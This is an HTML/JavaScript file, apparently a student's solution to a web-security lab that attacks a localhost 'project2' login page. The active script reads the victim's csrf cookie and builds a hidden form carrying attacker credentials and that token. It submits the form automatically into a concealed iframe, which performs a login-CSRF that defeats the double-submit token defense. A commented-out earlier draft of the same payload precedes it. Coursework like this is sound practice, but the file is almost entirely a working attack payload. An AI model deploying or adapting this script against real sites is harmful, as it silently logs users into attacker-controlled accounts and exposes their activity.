<!-- 
<script src='http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js'>  
</script>

<script>
    var csrf_cookie = document.cookie.split('; ').find(row => row.startsWith('csrf=')).split('=')[1]; 
</script>

<form name = 'CSRF' method = 'POST' target = 'hiddeniframe' action = 'http://localhost/project2/login?csrfdefense=1&xssdefense=0'>
  <input type = 'hidden' name = 'username' value = 'attacker'>
  <input type = 'hidden' name = 'password' value = 'badguy4'>
  <input type = 'hidden' name = 'csrf' value = csrf_cookie>
</form>


<script>
      console.log(CSRF); 
  </script>

<iframe name = 'hiddeniframe'></iframe> -->

<!-- <script>
    CSRF.submit();
</script> -->


<script>
var csrf_cookie = document.cookie.split('; ').find(row => row.startsWith('csrf=')).split('=')[1];
var form = document.createElement('form');
form.setAttribute('name', 'CSRF');
form.setAttribute('method', 'POST');
form.setAttribute('target', 'hiddeniframe');
form.setAttribute('action', 'http://localhost/project2/login?csrfdefense=1&xssdefense=0');
var inputUsername = document.createElement('input');
inputUsername.setAttribute('type', 'hidden');
inputUsername.setAttribute('name', 'username');
inputUsername.setAttribute('value', 'attacker');
var inputPassword = document.createElement('input');
inputPassword.setAttribute('type', 'hidden');
inputPassword.setAttribute('name', 'password');
inputPassword.setAttribute('value', 'badguy4');
var inputCsrf = document.createElement('input');
inputCsrf.setAttribute('type', 'hidden');
inputCsrf.setAttribute('name', 'csrf');
inputCsrf.setAttribute('value', csrf_cookie);
form.appendChild(inputUsername);
form.appendChild(inputPassword);
form.appendChild(inputCsrf);
document.body.appendChild(form);
var iframe = document.createElement('iframe');
iframe.setAttribute('name', 'hiddeniframe');
document.body.appendChild(iframe);
form.submit();
$('iframe[name=hiddeniframe]').hide();
</script>


